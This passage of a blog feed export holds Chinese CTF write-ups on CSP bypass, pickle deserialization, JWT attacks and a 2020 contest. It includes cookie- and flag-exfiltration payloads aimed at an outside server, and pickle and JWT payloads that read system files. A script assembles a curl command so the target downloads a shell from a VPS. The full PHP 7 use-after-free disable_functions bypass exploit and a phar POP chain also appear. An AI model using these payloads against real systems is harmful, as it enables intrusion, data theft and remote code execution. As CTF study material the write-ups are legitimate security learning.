class="headerlink" title="link标签绕过(比较老了)"></a>link标签绕过(比较老了)</h3><pre><code>&lt;!-- firefox --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//${cookie}.vps_ip&quot;&gt;&lt;!-- chrome --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?${cookie}&quot;&gt;</code></pre><p>带外数据的写法</p><pre><code class="js">var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link);</code></pre><p>使用条件：</p><p>k可以执行任意的js脚本，但是无法带外数据</p><h3 id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><blockquote><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p></blockquote><h3 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h3><p><a href="https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses" target="_blank" rel="noopener">收集</a></p><h2 id="CSP绕过实例"><a href="#CSP绕过实例" class="headerlink" title="CSP绕过实例"></a>CSP绕过实例</h2><h3 id="BSidesSF-2020-csp-1"><a href="#BSidesSF-2020-csp-1" class="headerlink" title="BSidesSF 2020 csp-1"></a>BSidesSF 2020 csp-1</h3><p>csp如下，<code>script-src</code> 支持 data</p><pre><code class="j">content-security-policy:     script-src &#39;self&#39; data:;     default-src &#39;self&#39;;     connect-src *;     report-uri /csp_report</code></pre><p>可以使用 <code>fetch</code> (js实在是不熟悉)</p><p>payload-1</p><pre><code>&lt;script src=&quot;data:,fetch(&#39;/csp-one-flag&#39;).then(x=&gt;x.text()).then(x=&gt;location=&#39;http://rwx.kr/?&#39;+escape(x))&quot;&gt;</code></pre><p>或者编码也是可以的</p><pre><code>// NOTE:// &quot;ZmV0Y...&quot; is base64 encoded text of this script.// fetch(&quot;https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag&quot;).then(r=&gt;r.text()).then(t=&gt;fetch(&quot;YOUR_SERVER&quot;+t))&lt;script src=&quot;data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ==&quot;&gt;&lt;/script&gt;</code></pre><h3 id="csp-2"><a href="#csp-2" class="headerlink" title="csp-2"></a>csp-2</h3><pre><code>Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri /csp_report</code></pre><p>看到了 <code>ajax.googleapis.com</code> 在白名单中，可以使用其提供的angularjs的模板注入来绕过</p><pre><code class="html">&lt;script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app ng-csp&gt;{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}&lt;/div&gt;</code></pre><p>payload2</p><pre><code class="js">&lt;script src=&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js&quot;&gt;&lt;/script&gt; &lt;div class=&quot;ng-app&quot;&gt; {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} &lt;/div&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python字符串的一些小坑</title>
      <link href="/posts/e247dc77/"/>
      <url>/posts/e247dc77/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/posts/2d71dd35/"/>
      <url>/posts/2d71dd35/</url>
      
        <content type="html"><![CDATA[<p>就分析几道例题吧</p><h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="CISCN 2019 ikun"></a>CISCN 2019 ikun</h2><p>这题开始脑洞比较大</p><p><img src="/posts/2d71dd35/1583819034564.png" alt></p><p>然后观察URL</p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=1</code></pre><p>开始以为这里有注入，因为加一个单引号网站就崩了</p><p>但是不然。是需要找到 <code>lv6</code></p><pre><code class="python">import requestsURL = &quot;http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/shop?page=&quot;for i in range(2000):    res = requests.get(URL+str(i))    if b&quot;lv6.png&quot; in res.content:        print(i)        break</code></pre><p>注意 <code>res.content</code> 返回的是byte类型， <code>res.text</code> 会自动转码为字符串</p><p>得到的结果是181</p><p><img src="/posts/2d71dd35/1583819267198.png" alt></p><p>当然按照管理你是买不起的</p><p>抓个包改一下折扣</p><p><img src="/posts/2d71dd35/1583819306763.png" alt></p><p>进入后台 </p><pre><code>http://b8869902-7911-4d16-bb0c-fe61550e2cea.node3.buuoj.cn/b1g_m4mber</code></pre><p><img src="/posts/2d71dd35/1583819326133.png" alt></p><p>注意到是用jwt认证的，爆破一下</p><p><img src="/posts/2d71dd35/1583819359124.png" alt></p><p>然后伪造一下进入admin，查看页面源代码有代码下载地址</p><p>审计代码</p><p>看到 <code>Admin.py</code></p><pre><code class="python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#39;become&#39;)            p = pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res=p, member=1)        except:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)</code></pre><p>会反序列化传过来的 become 参数，于是</p><pre><code class="python">import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p>生成</p><pre><code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre><p>提交即可</p><p><img src="/posts/2d71dd35/1583819516737.png" alt></p><h2 id="抗疫分享赛webtmp"><a href="#抗疫分享赛webtmp" class="headerlink" title="抗疫分享赛webtmp"></a>抗疫分享赛webtmp</h2><p>这题涉及到了如何手动构造 pickle 数据</p><p>复习一下指令</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的网站</title>
      <link href="/posts/f364e7d6/"/>
      <url>/posts/f364e7d6/</url>
      
        <content type="html"><![CDATA[<h2 id="大师傅"><a href="#大师傅" class="headerlink" title="大师傅"></a>大师傅</h2><p><a href="http://szfszf.top/" target="_blank" rel="noopener">http://szfszf.top/</a></p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>bypass disabled function </p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tornado框架</title>
      <link href="/posts/11fc1d3/"/>
      <url>/posts/11fc1d3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jwt学习笔记</title>
      <link href="/posts/70fc8f0c/"/>
      <url>/posts/70fc8f0c/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p><p>jwt由三个部分组成</p><pre><code>header.payload.signature</code></pre><p>首先看 <code>header</code></p><p><code>alg</code> 指定了token加密使用的算法（最常用的为<strong>HMAC</strong>和<strong>RSA</strong>算法</p><p>HMAC：对称</p><p>RSA：非对称</p><blockquote><p>HASH: 压缩</p><p>MAC: 带密钥的hash</p><p>HMAC: MAC的一种</p></blockquote><pre><code>{        &quot;alg&quot; : &quot;HS256&quot;,        &quot;typ&quot; : &quot;jwt&quot;}</code></pre><p><code>payload</code></p><p>相关的数据：</p><pre><code>{    &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者    &quot;iat&quot;: 1573440582,        //签发时间    &quot;exp&quot;: 1573940267,        //过期时间    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识}</code></pre><p><code>signature</code> ,保护token完整性</p><pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><h2 id="pyjwt"><a href="#pyjwt" class="headerlink" title="pyjwt"></a>pyjwt</h2><p>（注意是必须 pip install pyjwt</p><pre><code>In [1]: import jwtIn [2]: encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)In [3]: encoded_jwtOut[3]: b&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.fN_uBYJZuGWi_XnqKe_HDo6EYBU8Te1nanJRBnpnPns&#39;</code></pre><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 解密</p><p>可以看到并不需要key也可以直接解密，有点像flask 的session</p><p><img src="/posts/70fc8f0c/1584601836858.png" alt></p><p>解密</p><pre><code>In [4]: print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;])){&#39;user_name&#39;: &#39;admin&#39;}</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h3><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p><p>pyjwt生成空加密算法的jwt</p><pre><code class="python">In [10]: encoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, headers={&quot;alg&quot;:&quot;None&quot;, &quot;typ&quot;:&quot;jwt&quot;})In [11]: encoded_jwtOut[11]: b&#39;eyJ0eXAiOiJqd3QiLCJhbGciOiJOb25lIn0.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.73u0KBesnvDB-k3jhmyzzPnExs8gUsxaYG2MBtBeNtg&#39;</code></pre><p><img src="/posts/70fc8f0c/1584602118605.png" alt></p><h3 id="修改加密算法RSA为HMAC-未尝试"><a href="#修改加密算法RSA为HMAC-未尝试" class="headerlink" title="修改加密算法RSA为HMAC(未尝试)"></a>修改加密算法RSA为HMAC(未尝试)</h3><p>理论：</p><p>一个Web应用，在JWT传输过程中使用RSA算法，密钥<code>pem</code>对JWT token进行签名，公钥<code>pub</code>对签名进行验证。</p><p>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC</p><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;}</code></pre><p>同时使用公钥pub作为密钥，这样服务端接收到的数据就会用HMAC的方式来验证了</p><h3 id="爆破密钥"><a href="#爆破密钥" class="headerlink" title="爆破密钥"></a>爆破密钥</h3><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>了解一下</p><h3 id="修改kid参数"><a href="#修改kid参数" class="headerlink" title="修改kid参数"></a>修改kid参数</h3><p>用来指定私钥位置，也可以修改？</p><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;}</code></pre><h3 id="任意文件读取？-有点骚"><a href="#任意文件读取？-有点骚" class="headerlink" title="任意文件读取？(有点骚)"></a>任意文件读取？(有点骚)</h3><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;/etc/passwd&quot;}</code></pre><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><pre><code>{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;key11111111&#39; || union select &#39;secretkey&#39; -- &quot;}</code></pre><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><pre><code>&quot;/path/to/key_file|whoami&quot;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6776#toc-4" target="_blank" rel="noopener">jwt安全问题</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requests文档阅读笔记</title>
      <link href="/posts/bce54486/"/>
      <url>/posts/bce54486/</url>
      
        <content type="html"><![CDATA[<h2 id="如何发送post请求"><a href="#如何发送post请求" class="headerlink" title="如何发送post请求"></a>如何发送post请求</h2><pre><code> r = requests.post(&#39;http://httpbin.org/post&#39;, data = {&#39;key&#39;:&#39;value&#39;})</code></pre><p>其他的请求也类似</p><pre><code>&gt;&gt;&gt; r = requests.put(&#39;http://httpbin.org/put&#39;, data = {&#39;key&#39;:&#39;value&#39;})&gt;&gt;&gt; r = requests.delete(&#39;http://httpbin.org/delete&#39;)&gt;&gt;&gt; r = requests.head(&#39;http://httpbin.org/get&#39;)&gt;&gt;&gt; r = requests.options(&#39;http://httpbin.org/get&#39;)</code></pre><h2 id="GET请求如何传递URL参数"><a href="#GET请求如何传递URL参数" class="headerlink" title="GET请求如何传递URL参数"></a>GET请求如何传递URL参数</h2><pre><code>In [12]: r = requests.get(url,params={&quot;key1&quot;:&quot;1&quot;, &quot;key2&quot;:&quot;2&quot;})In [13]: r.urlOut[13]: &#39;http://httpbin.org/get?key2=2&amp;key1=1&#39;</code></pre><p>但是怎么传递数组呢？这是个问题</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>战疫分享赛wp</title>
      <link href="/posts/2f3193b1/"/>
      <url>/posts/2f3193b1/</url>
      
        <content type="html"><![CDATA[<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip源码，审计之后看到两个很有意思的操作" target="_blank" rel="noopener">www.zip源码，审计之后看到两个很有意思的操作</a></p><p>根目录下的 <code>init.php</code>文件中</p><pre><code class="php">&lt;?php//初始化整个页面error_reporting(0);//lib.php包括一些常见的函数include &#39;lib.php&#39;;session_save_path(&#39;session&#39;);ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();</code></pre><p>但是在 <code>core</code> 目录下的 <code>init.php</code> 中</p><pre><code class="php">&lt;?php//初始化整个页面#error_reporting(0);//lib.php包括一些常见的函数include &#39;../lib.php&#39;;session_save_path(&#39;../session&#39;);ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();</code></pre><p>用了两种不同的session处理方式</p><p>所以提交一个签名为</p><pre><code>|O:4:&quot;info&quot;:1:{s:5:&quot;admin&quot;;i:1;}</code></pre><p>这样再访问 <code>profile.php</code> 的时候</p><pre><code class="php">&lt;?phperror_reporting(0);session_save_path(&#39;session&#39;);include &#39;lib.php&#39;;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class info{    public $admin;    public $sign;    public function __construct()    {        $this-&gt;admin = $_SESSION[&#39;admin&#39;];        $this-&gt;sign = $_SESSION[&#39;sign&#39;];    }    public function __destruct()    {        echo $this-&gt;sign;        if ($this-&gt;admin === 1) {            redirect(&#39;./core/index.php&#39;);        }    }}$a = new info();?&gt;</code></pre><p>就会触发反序列化，然后进入 <code>core/index.php</code> 中</p><p><code>core/index.php</code> 的源代码</p><pre><code>&lt;?phprequire_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #hint : core/clear.php    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo $sandbox;    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_POST[&#39;url&#39;])) {        $url = $_POST[&#39;url&#39;];        if (filter_var($url, FILTER_VALIDATE_URL)) {            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {                echo &quot;you are hacker&quot;;            } else {                $res = parse_url($url);                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {                    $code = file_get_contents($url);                    if (strlen($code) &lt;= 4) {                        @exec($code);                    } else {                        echo &quot;try again&quot;;                    }                }            }        } else {            echo &quot;invalid url&quot;;        }    } else {        highlight_file(__FILE__);    }} else {    die(&#39;只有管理员才能看到我哟&#39;);}</code></pre><p>不准用 <code>data</code> 协议，并且解析到的host必须是 <code>127.0.0.1</code> 初看还挺像2019年的byteCTF，但是这里用到的是 <code>compress.zlib</code> 协议(学习了)</p><pre><code>compress.zlib://data:@127.0.0.1/baidu.com?,ls</code></pre><p>当然也可以用base64的方式</p><pre><code>compress.zlib://data:@127.0.0.1/plain;base64,</code></pre><p>之后需要绕过长度来执行命令，脚本就用队友的好了，不能弹shell，只能从vps上下载shell到靶机上</p><pre><code class="python">import requestsfrom time import sleepfrom urllib import parsefrom requests import sessionimport base64import randoms = session()url = &quot;http://121.36.222.22:88/login.php&quot;s.post(url, data={&#39;name&#39;:&#39;pxypxy&#39;})url1 = &quot;http://121.36.222.22:88/?page=upload&quot;s.post(url1, data={&#39;sign&#39;:&#39;woc|O:4:&quot;info&quot;:2:{s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:4:&quot;ssss&quot;;}&#39;})url3 = &quot;http://121.36.222.22:88/core/index.php&quot;s.get(url3)ip = &#39;x.x.x.x&#39;ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))for i in ip.split(&#39;.&#39;)])pos0 = &#39;y&#39;pos1 = &#39;d&#39;pos2 = &#39;s&#39;payload = [    &#39;&gt;dir&#39;,    &#39;&gt;%s\&gt;&#39; % pos0,    &#39;&gt;%st-&#39; % pos1,    &#39;&gt;sl&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;%s&#39; % pos2,    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;y.\\&#39;,    &#39;&gt;\&gt;\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    &#39;sh &#39; + pos0,]for i in payload:    data = {&#39;url&#39;:&#39;compress.zlib://data:@127.0.0.1/plain;base64,&#39;+base64.b64encode(i.encode()).decode()}    r = s.post(url3, data=data)    print(r.text)    print(data[&#39;url&#39;])    sleep(0.1)</code></pre><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>分析</p><p>考点是pickle反序列化，过滤掉了  R 指令码，并且重写了 <code>find_class</code>：</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))</code></pre><p>这就禁止引用除了 <code>__main__</code> 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改</p><p>于是可以先引入 <code>__main__.secret</code> 这个module，然后把一个 dict 压入栈，内容是 <code>{&#39;name&#39;: &#39;xx&#39;, &#39;category&#39;: &#39;yyy&#39;}</code>,之后执行 build指令，改写 <code>__main__.secret.name</code> 和 <code>__main__.secret.category</code>,此时 <code>secret.name</code>和 <code>secret.category</code> 已经变成我们想要的内容</p><p>之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下</p><pre><code>b&quot;\x80\x03c__main__\nsecret\n}(Vname\nVxx\nVcategory\nVyyy\nub0c__main__\nAnimal\n)\x81}(S&#39;name&#39;\nS&#39;xx&#39;\nS&#39;category&#39;\nS&#39;yyy&#39;\nub.&quot;</code></pre><p>编码为base64提交即可</p><pre><code>gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg==</code></pre><h2 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">脚本</a></p><pre><code class="php">rddshell&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&#39;/readflag&#39;);function pwn($cmd) {    global $abc, $helper, $backtrace;    class Vuln {        public $a;        public function __destruct() {             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace(); # ;)            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &gt;= 7.4                $backtrace = debug_backtrace();            }        }    }    class Helper {        public $a, $b, $c, $d;    }    function str2ptr(&amp;$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) {            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    function ptr2str($ptr, $m = 8) {        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) {            $out .= chr($ptr &amp; 0xff);            $ptr &gt;&gt;= 8;        }        return $out;    }    function write(&amp;$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i &lt; $n; $i++) {            $str[$p + $i] = chr($v &amp; 0xff);            $v &gt;&gt;= 8;        }    }    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }        return $leak;    }    function parse_elf($base) {        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) {            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;constant&#39; constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {                $deref = leak($leak);                # &#39;bin2hex&#39; constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return leak($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    function trigger_uaf($arg) {        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat(&#39;A&#39;, 79));        $vuln = new Vuln();        $vuln-&gt;a = $arg;    }    if(stristr(PHP_OS, &#39;WIN&#39;)) {        die(&#39;This PoC is for *nix systems only.&#39;);    }    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat(&#39;A&#39;, 79));    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) { };    if(strlen($abc) == 79 || strlen($abc) == 0) {        die(&quot;UAF failed&quot;);    }    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) {        die(&quot;Couldn&#39;t determine binary base address&quot;);    }    if(!($elf = parse_elf($base))) {        die(&quot;Couldn&#39;t parse ELF header&quot;);    }    if(!($basic_funcs = get_basic_funcs($base, $elf))) {        die(&quot;Couldn&#39;t get basic_functions address&quot;);    }    if(!($zif_system = get_system($basic_funcs))) {        die(&quot;Couldn&#39;t get zif_system address&quot;);    }    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) {        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    }    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper-&gt;b)($cmd);    exit();}</code></pre><p>上传到tmp目录就行了</p><p><img src="/posts/2f3193b1/1583803771844.png" alt></p><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p><code>www.zip</code> 源码泄露(现在好多web题都喜欢这么搞了)</p><p>这题主要是对伪造mysql的考察，但是有一个坑点</p><p><img src="/posts/2f3193b1/1583812041964.png" alt></p><p>我们可以设置<code>option</code>为8，然后就启用<code>MYSQL_OPT_LOCAL_INFILE</code>了。</p><p><img src="/posts/2f3193b1/1583812118883.png" alt></p><p>之后构造一个POP链就行了，POP链不是很长</p><pre><code class="php">&lt;?phpclass Listfile{    public $file;    function __construct()    {        $this-&gt;file = &quot;;/readflag&quot;;    }}class Fileupload{    public $file;    function __construct()    {        $this-&gt;file = new Listfile();    }}$payload = new Fileupload();$exp = new Phar(&#39;yds.phar&#39;);$exp -&gt; startBuffering();$exp-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);$exp -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);$exp -&gt; setMetadata($payload);$exp -&gt; stopBuffering();</code></pre><p><img src="/posts/2f3193b1/0.png" alt></p><h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>这题估计是很多队伍都比较头疼的了，3月7日那天折腾了一下午直到晚上才有师傅做出来</p><p>源代码</p><pre><code 